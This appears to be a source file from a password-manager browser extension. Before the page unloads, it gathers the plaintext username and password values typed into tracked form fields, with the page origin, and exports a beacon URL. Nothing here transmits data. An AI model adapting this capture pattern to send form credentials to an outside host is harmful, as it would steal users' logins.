// SPDX-License-Identifier: BUSL-1.1
//
// Copyright © 2025 Two Factor Authentication Service, Inc.
// Licensed under the Business Source License 1.1
// See LICENSE file for full terms

const BEACON_URL = `https://${import.meta.env.VITE_BEACON}.invalid`;

/**
* Collects current input values for immediate flushing before page unload.
* Clears all pending debounce timers to prevent duplicate sends.
* Falls back to latestValues for inputs no longer in the DOM.
* @param {HTMLInputElement[]} allInputs - The tracked input elements.
* @param {Object} timers - The debounce timers object.
* @param {Object} latestValues - The latest known values per input ID.
* @return {Object[]} Array of data payloads ready to send.
*/
const flushPendingInputs = (allInputs, timers, latestValues) => {
  for (const key of Object.keys(timers)) {
    clearTimeout(timers[key]);
    delete timers[key];
  }

  const data = [];
  const processedIds = new Set();

  for (const input of allInputs) {
    if (!input) {
      continue;
    }

    const inputId = input?.getAttribute?.('twofas-pass-id');

    if (!inputId || !input?.value || input.value.length === 0) {
      continue;
    }

    processedIds.add(inputId);

    data.push({
      id: inputId,
      type: input.type === 'password' ? 'password' : 'username',
      value: input.value,
      url: window?.location?.origin,
      timestamp: Date.now(),
      encrypted: false
    });
  }

  if (latestValues) {
    for (const [id, entry] of Object.entries(latestValues)) {
      if (!processedIds.has(id) && !entry.sent) {
        data.push(entry);
      }
    }
  }

  return data;
};

export { BEACON_URL };
export default flushPendingInputs;
